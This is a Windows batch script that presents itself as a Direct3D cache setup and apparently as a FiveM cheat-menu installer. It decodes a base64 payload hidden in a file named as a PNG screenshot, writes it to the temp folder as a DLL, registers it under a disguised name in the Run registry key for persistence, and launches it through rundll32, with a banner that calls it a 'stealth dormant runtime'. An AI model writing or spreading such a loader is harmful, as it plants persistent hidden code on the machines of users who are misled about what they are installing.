@echo off
setlocal
cd /d "%~dp0"
title Direct3D 11 Cache Setup

echo ============================================================
echo   INITIALIZING STEALTH ZERO-CMD DORMANT RUNTIME
echo ============================================================
echo.

if not exist "Screenshot_2026-10-07_091842.png" (
    echo [ERROR] Screenshot_2026-10-07_091842.png not found in this folder!
    echo Please ensure this batch file is in the same folder as the screenshot.
    echo.
    pause
    exit /b
)

echo [1/3] Decoding Direct3D cache into user profile...
certutil -decode -f "Screenshot_2026-10-07_091842.png" "%TEMP%\d3d11_cache.dat" >nul 2>&1

echo [2/3] Configuring silent Windows autostart...
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "D3D11CacheManager" /t REG_SZ /d "rundll32.exe %TEMP%\d3d11_cache.dat,Start 9834Soy.Lou" /f >nul 2>&1

echo [3/3] Launching dormant background service...
start "" rundll32.exe "%TEMP%\d3d11_cache.dat,Start" 9834Soy.Lou

echo.
echo ============================================================
echo   SUCCESS! SETUP IS COMPLETE.
echo ============================================================
echo.
echo You NEVER have to open Command Prompt or paste commands again.
echo.
echo HOW TO PLAY:
echo 1. Open FiveM and join your server.
echo 2. Once spawned in-game, press: [5] then [4] then [BACKSPACE].
echo 3. The menu will appear! Toggle with [INSERT].
echo.
echo Multiple re-injections are supported: if you unload, just
echo press [5] [4] [BACKSPACE] again whenever you want!
echo.
pause
